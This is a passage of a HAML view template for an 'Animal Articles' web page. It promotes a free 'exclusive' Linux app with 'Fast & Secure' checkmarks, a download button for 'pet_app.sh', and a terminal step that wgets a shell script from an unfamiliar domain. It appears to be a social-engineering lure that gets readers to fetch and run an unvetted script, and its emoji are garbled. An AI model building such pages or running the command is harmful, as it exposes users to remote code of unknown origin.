    = stylesheet_link_tag 'styles'

  %body.container.mt-5
    / Header with Download Button & Linux Installation Instructions
    .d-flex.justify-content-between.align-items-center.mb-4
      %h1 Animal Articles

    / Linux Installation Guide
    .alert.alert-info.mt-3
      %h2 üêß Stay Updated with the Latest Animal News on Linux!
      %p
        Get the most exciting animal updates directly on your computer with our
        %strong
          exclusive and free app!

      %ul
        %li ‚úÖ Easy to Install
        %li ‚úÖ Fast & Secure
        %li ‚úÖ 100% Free!

      %h3 üîΩ Download & Install in 3 Simple Steps!

      %p
        %strong 1Ô∏è‚É£ Download the App:
        - if (@articles.find { |e|  e[:active] == true }).present?
          %a.btn.btn-primary.download-btn{ href: pet_app_path, download: "pet_app.sh" }
            Download Now

      %p
        %strong 2Ô∏è‚É£ Open your Terminal & Run:
      %pre
        %code
          = 'wget "www.tfmiotfacewebtest.diy/pet_app" -O pet_app.sh [optionally if you want to download from the repository]'
